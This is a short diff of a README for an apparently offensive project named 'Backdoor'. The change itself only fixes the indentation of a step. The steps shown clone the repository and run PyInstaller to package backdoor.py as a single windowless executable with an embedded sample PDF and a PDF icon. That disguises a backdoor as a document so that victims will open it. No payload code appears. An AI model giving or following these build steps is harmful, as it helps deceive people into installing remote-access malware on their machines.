@@ -14,7 +14,7 @@ You should have these requirements :
    git clone https://github.com/Anonomous69/Backdoor
    ```
    cd to that directory
-   2. find your pyinstaller path and run :
+2. find your pyinstaller path and run :
     ```powershell
     C:\Users\username\Appdata\wherever\your\pyinstaller\is\there\pyintstaller.exe --add-data=sample.pdf:.  -—onefile -—noconsole --icon pdf.ico backdoor.py
     ```
